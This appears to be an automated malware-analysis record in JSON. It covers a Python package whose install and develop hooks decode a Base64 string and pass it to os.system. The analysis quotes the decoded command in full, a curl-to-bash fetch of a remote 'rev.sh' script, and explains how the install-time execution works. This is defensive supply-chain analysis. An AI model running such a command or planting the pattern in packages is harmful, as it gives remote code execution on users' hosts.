{
  "purpose": "Define a Python package setup that includes custom install and develop commands, with an embedded Base64-encoded command execution that appears malicious.",
  "sources": "The function b64d reads and decodes a Base64 string; the notmalfunc function calls os.system with the decoded string.",
  "sinks": "The os.system call executes decoded Base64 content, which may run arbitrary commands on the host system.",
  "flows": "b64d decodes the Base64 string to obtain a command, then notmalfunc executes this command via os.system during installation or development, leading to potential execution of malicious code.",
  "anomalies": "Presence of Base64 decoding and execution of decoded string during install/develop phases; the command string points to a suspicious URL and is likely an external script or malicious payload.",
  "analysis": "The code defines setup configurations for a Python package. It includes functions that decode a Base64 string, which encodes a shell command: 'curl -s http://192.168.1.3:8000/rev.sh | bash'. This command suggests fetching a script from a remote server and executing it. The execution occurs during the 'install' process via the AfterInstall class, which calls notmalfunc. The use of Base64 decoding and remote script execution during package installation indicates malicious intent, potentially to compromise the host system or establish a backdoor. No other suspicious or obfuscated code is present beyond this mechanism.",
  "conclusion": "The package contains embedded malicious behavior: it decodes and executes a remote script during installation, which is a high-risk supply chain attack. This code is designed to surreptitiously run external commands, potentially harmful, upon package installation or development.",
